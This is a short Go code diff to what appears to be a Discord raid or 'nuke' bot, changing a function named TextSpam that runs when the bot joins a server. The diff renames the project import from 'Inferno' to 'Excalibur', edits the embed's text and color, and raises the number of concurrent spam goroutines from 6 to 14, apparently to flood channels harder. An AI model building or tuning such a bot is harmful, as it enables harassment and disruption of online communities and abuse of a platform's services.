@@ -1,7 +1,7 @@
 package creating
 
 import (
-	"Inferno/core/requests"
+	"Excalibur/core/requests"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -42,8 +42,8 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 
 	embed := discordgo.MessageEmbed{
 		Title:       EMBED_TITLE,
-		Description: EMBED_DESCRIPTION + "\n\n" + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
-		Color:       00255,
+		Description: EMBED_DESCRIPTION + "\n\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
+		Color:       1677721,
 		Thumbnail:   &thumbnail,
 	}
 
@@ -72,7 +72,7 @@ func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitG
 
 	jsonData, _ = json.Marshal(dataMsg)
 
-	for i := 0; i < 6; i++ {
+	for i := 0; i < 14; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
